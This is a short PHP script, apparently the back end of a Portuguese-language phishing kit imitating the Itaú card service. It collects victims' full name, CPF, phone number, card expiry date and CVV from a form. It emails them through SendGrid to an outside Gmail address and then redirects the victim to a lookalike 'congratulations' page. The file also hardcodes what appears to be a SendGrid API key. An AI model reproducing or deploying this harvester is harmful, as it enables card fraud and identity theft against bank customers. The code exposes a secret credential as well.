<?php
		
	$nomecompleto = $_POST['nomecompleto'];
	$numcpf = $_POST['numcpf'];
	$numtel = $_POST['numtel'];
	$numdtv = $_POST['numdtv'];
	$numcvv = $_POST['numcvv'];
	
        require 'vendor/autoload.php';

        $from = new SendGrid\Email(null, "apple-tope@live.com");
        $subject = "Chegou novos dados";
        $to = new SendGrid\Email(null, "marcos985970@gmail.com");
        $content = new SendGrid\Content("text/html", "Nome: $nomecompleto - CPF: $numcpf - Telefone $numtel - VALIDADE $numdtv - CVV $numcvv");
        $mail = new SendGrid\Mail($from, $subject, $to, $content);
        
        //Necessário inserir a chave
        $apiKey = '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';
        $sg = new \SendGrid($apiKey);

        $response = $sg->client->mail()->send()->post($mail);
		
	header('Location: https://itaucardcartoes.lordbrasil.info/parabens.html');
        ?>
